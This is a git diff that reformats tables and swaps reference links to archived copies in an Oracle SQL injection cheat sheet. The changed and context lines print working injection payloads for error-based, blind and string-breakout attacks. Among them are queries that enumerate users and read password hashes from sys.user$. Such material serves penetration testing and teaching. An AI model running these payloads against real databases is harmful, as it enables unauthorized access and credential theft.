@@ -29,10 +29,10 @@
 
 ## Oracle SQL Default Databases
 
-| Name               | Description               |
-|--------------------|---------------------------|
-| SYSTEM             | Available in all versions |
-| SYSAUX             | Available in all versions |
+| Name   | Description               |
+| ------ | ------------------------- |
+| SYSTEM | Available in all versions |
+| SYSAUX | Available in all versions |
 
 ## Oracle SQL Comments
 
@@ -43,7 +43,7 @@
 
 ## Oracle SQL Enumeration
 
-| Description   | SQL Query |
+| Description   | SQL Query                                                    |
 | ------------- | ------------------------------------------------------------ |
 | DBMS version  | `SELECT user FROM dual UNION SELECT * FROM v$version`        |
 | DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';`  |
@@ -63,7 +63,7 @@
 ## Oracle SQL Database Credentials
 
 | Query                                   | Description               |
-|-----------------------------------------|---------------------------|
+| --------------------------------------- | ------------------------- |
 | `SELECT username FROM all_users;`       | Available on all versions |
 | `SELECT name, password from sys.user$;` | Privileged, <= 10g        |
 | `SELECT name, spare4 from sys.user$;`   | Privileged, <= 11g        |
@@ -95,36 +95,36 @@ SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_N
 
 ## Oracle SQL Error Based
 
-| Description           | Query          |
-| :-------------------- | :------------- |
-| Invalid HTTP Request  | `SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual` |
-| CTXSYS.DRITHSX.SN     | `SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual` |
-| Invalid XPath         | `SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual` |
-| Invalid XML           | `SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual` |
-| Invalid XML           | `SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users` |
-| SQL Error             | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))` |
-| XDBURITYPE getblob    | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |
-| XDBURITYPE getclob    | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()` |
-| XMLType               | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\|\|CHR(58)\|\|'~'\|\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\|\|'~'\|\|CHR(62))) FROM DUAL) -- -` |
-| DBMS_UTILITY          | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\|\|(SELECT banner FROM v$version)\|\|'~') -- -` |
+| Description          | Query                                                                                                                                                                                                                 |
+| :------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Invalid HTTP Request | `SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual`                                                                                                                            |
+| CTXSYS.DRITHSX.SN    | `SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual`                                                                                                                              |
+| Invalid XPath        | `SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual`                                                                                                          |
+| Invalid XML          | `SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual`                                                                                        |
+| Invalid XML          | `SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users`                                                                                                    |
+| SQL Error            | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))`                                                                               |
+| XDBURITYPE getblob   | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()`                                                                                                                                    |
+| XDBURITYPE getclob   | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()`                                                                                           |
+| XMLType              | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\|\|CHR(58)\|\|'~'\|\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\|\|'~'\|\|CHR(62))) FROM DUAL) -- -` |
+| DBMS_UTILITY         | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\|\|(SELECT banner FROM v$version)\|\|'~') -- -`                                                                                                                           |
 
 When the injection point is inside a string use : `'||PAYLOAD--`
 
 ## Oracle SQL Blind
 
-| Description              | Query          |
-| :----------------------- | :------------- |
-| Version is 12.2        | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |
-| Subselect is enabled    | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)` |
-| Table log_table exists   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);` |
+| Description                              | Query                                                                                            |
+| :--------------------------------------- | :----------------------------------------------------------------------------------------------- |
+| Version is 12.2                          | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';`                               |
+| Subselect is enabled                     | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)`                                                |
+| Table log_table exists                   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);`                                          |
 | Column message exists in table log_table | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |
-| First letter of first message is t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |
+| First letter of first message is t       | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';`                            |
 
 ### Oracle Blind With Substring Equivalent
 
-| Function    | Example                                   |
-| ----------- | ----------------------------------------- |
-| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |
+| Function | Example                               |
+| -------- | ------------------------------------- |
+| `SUBSTR` | `SUBSTR('foobar', <START>, <LENGTH>)` |
 
 ## Oracle SQL Time Based
 
@@ -229,8 +229,8 @@ utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
 ## References
 
 * [ASDC12 - New and Improved Hacking Oracle From Web - Sumit “sid” Siddharth - November 8, 2021](https://web.archive.org/web/20211108150011/https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)
-* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
+* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://web.archive.org/web/20260203031530/https://sqlwiki.netspi.com/injectionTypes/errorBased/)
 * [ODAT: Oracle Database Attacking Tool - quentinhardy - March 24, 2016](https://github.com/quentinhardy/odat/wiki/privesc)
-* [Oracle SQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
-* [Pentesting Oracle TNS Listener - HackTricks - July 19, 2024](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
-* [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://www.websec.ca/kb/sql_injection#Oracle_Default_Databases)
+* [Oracle SQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](https://web.archive.org/web/20260228095123/https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
+* [Pentesting Oracle TNS Listener - HackTricks - July 19, 2024](https://web.archive.org/web/20220519160744/https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
+* [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://web.archive.org/web/20260302110304/https://www.websec.ca/kb/sql_injection)
